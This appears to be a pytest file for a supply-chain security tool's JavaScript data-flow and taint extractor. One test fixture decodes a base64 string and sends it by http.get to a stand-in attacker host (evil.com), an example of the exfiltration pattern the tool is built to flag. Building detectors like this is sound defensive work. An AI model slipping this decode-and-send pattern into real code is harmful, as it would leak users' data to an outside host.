"""Tests for supplyguard.parsing.dfg_extractor."""

import tempfile
from pathlib import Path

from supplyguard.parsing.ast_extractor import extract_ast
from supplyguard.parsing.dfg_extractor import extract_dfg


def _build(js_code: str):
    """Helper: write JS, run extract_ast → extract_dfg."""
    with tempfile.TemporaryDirectory() as tmpdir:
        (Path(tmpdir) / "test.js").write_text(js_code, encoding="utf-8")
        nodes, ast_edges = extract_ast(tmpdir)
        dfg_edges, taint_flags = extract_dfg(nodes, ast_edges)
        return nodes, dfg_edges, taint_flags


def _print_dfg(label: str, nodes, dfg_edges, taint_flags):
    node_by_id = {n["id"]: n for n in nodes}
    print(f"\n{'='*70}")
    print(f"  {label}")
    print(f"  {len(dfg_edges)} def-use edge(s), {len(taint_flags)} taint flag(s)")
    print(f"{'='*70}")
    for e in dfg_edges:
        src = node_by_id[e["source_id"]]
        tgt = node_by_id[e["target_id"]]
        print(
            f"  [def→use]  {src['type']}({src['text'][:50]!r})"
            f"  →  {tgt['type']}({tgt['text']!r})"
        )
    if taint_flags:
        print(f"\n  --- taint flags ---")
        for tf in taint_flags:
            n = node_by_id[tf["node_id"]]
            print(
                f"  [{tf['flag_type']:6s}]  {tf['detail']}"
                f"  @ {n['type']}({n['text'][:50]!r})"
            )
    print("=" * 70)


# ------------------------------------------------------------------
# Test 1 — data-flow chain through tainted variables
# ------------------------------------------------------------------

JS_TAINTED_CHAIN = """\
const http = require("http");
const payload = "aGVsbG8gd29ybGQ=";
const decoded = Buffer.from(payload, "base64").toString();
const url = "http://evil.com/?d=" + decoded;
http.get(url);
"""


def test_tainted_data_flow():
    nodes, dfg_edges, taint_flags = _build(JS_TAINTED_CHAIN)
    _print_dfg("Tainted data-flow chain", nodes, dfg_edges, taint_flags)

    node_by_id = {n["id"]: n for n in nodes}

    # --- def-use: payload ---
    payload_use_edges = [
        e for e in dfg_edges
        if node_by_id[e["target_id"]]["type"] == "identifier"
        and node_by_id[e["target_id"]]["text"] == "payload"
    ]
    assert payload_use_edges, (
        "expected a def-use edge targeting the 'payload' identifier"
    )
    payload_def_ids = {
        n["id"] for n in nodes
        if n["type"] == "variable_declarator" and "payload" in n["text"]
    }
    assert any(e["source_id"] in payload_def_ids for e in payload_use_edges), (
        "payload use should trace back to its variable_declarator definition"
    )

    # --- def-use: decoded ---
    decoded_use_edges = [
        e for e in dfg_edges
        if node_by_id[e["target_id"]]["type"] == "identifier"
        and node_by_id[e["target_id"]]["text"] == "decoded"
    ]
    assert decoded_use_edges, (
        "expected a def-use edge targeting the 'decoded' identifier"
    )
    decoded_def_ids = {
        n["id"] for n in nodes
        if n["type"] == "variable_declarator" and "decoded" in n["text"]
    }
    assert any(e["source_id"] in decoded_def_ids for e in decoded_use_edges), (
        "decoded use should trace back to its variable_declarator definition"
    )

    # --- def-use: url ---
    url_use_edges = [
        e for e in dfg_edges
        if node_by_id[e["target_id"]]["type"] == "identifier"
        and node_by_id[e["target_id"]]["text"] == "url"
    ]
    assert url_use_edges, (
        "expected a def-use edge targeting the 'url' identifier"
    )
    url_def_ids = {
        n["id"] for n in nodes
        if n["type"] == "variable_declarator" and n["text"].startswith("url")
    }
    assert any(e["source_id"] in url_def_ids for e in url_use_edges), (
        "url use should trace back to its variable_declarator definition"
    )

    # --- taint source: Buffer.from with base64 ---
    sources = [t for t in taint_flags if t["flag_type"] == "source"]
    assert sources, "expected at least one taint source (Buffer.from + base64)"

    # --- taint sink: http.get ---
    sinks = [t for t in taint_flags if t["flag_type"] == "sink"]
    assert sinks, "expected at least one taint sink (http.get)"
    http_sinks = [
        t for t in sinks
        if "http" in node_by_id[t["node_id"]]["text"]
    ]
    assert http_sinks, "expected an http.get sink"


# ------------------------------------------------------------------
# Test 2 — clean code (no taint)
# ------------------------------------------------------------------

JS_CLEAN = """\
function add(a, b) {
  return a + b;
}
const result = add(1, 2);
console.log(result);
"""


def test_clean_code_no_taint():
    nodes, dfg_edges, taint_flags = _build(JS_CLEAN)
    _print_dfg("Clean code — no taint", nodes, dfg_edges, taint_flags)

    node_by_id = {n["id"]: n for n in nodes}

    # There should be *some* def-use edges (e.g. result → console.log arg)
    result_use_edges = [
        e for e in dfg_edges
        if node_by_id[e["target_id"]]["type"] == "identifier"
        and node_by_id[e["target_id"]]["text"] == "result"
    ]
    assert result_use_edges, (
        "expected a def-use edge for 'result' (used in console.log)"
    )

    # Also expect edges for params a, b used in return statement
    param_uses = [
        e for e in dfg_edges
        if node_by_id[e["target_id"]]["text"] in ("a", "b")
        and node_by_id[e["target_id"]]["type"] == "identifier"
    ]
    assert param_uses, (
        "expected def-use edges for function parameters a and b"
    )

    # Taint flags must be empty
    assert taint_flags == [], (
        f"expected no taint flags for clean code, got {taint_flags}"
    )
